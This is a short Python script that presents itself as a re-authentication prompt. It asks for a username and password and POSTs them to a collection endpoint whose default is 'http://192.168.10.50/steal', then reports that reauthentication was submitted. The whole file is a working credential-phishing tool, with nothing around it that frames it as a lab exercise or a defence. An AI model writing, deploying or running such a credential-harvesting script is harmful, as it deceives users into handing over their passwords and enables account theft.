#!/usr/bin/env python3
import urllib.request
import urllib.parse

reauth_url = input("Re-authentication URL [http://192.168.10.50/steal]: ").strip()
if not reauth_url:
    reauth_url = "http://192.168.10.50/steal"

username = input("Username: ").strip()
password = input("Password: ").strip()

data = urllib.parse.urlencode({
    "username": username,
    "password": password
}).encode()

req = urllib.request.Request(reauth_url, data=data, method="POST")

try:
    resp = urllib.request.urlopen(req, timeout=5)
    print("reauthentication_status=%s" % resp.status)
    print("reauthentication_submitted=yes")
except Exception as e:
    print("reauthentication_error=%s" % e)
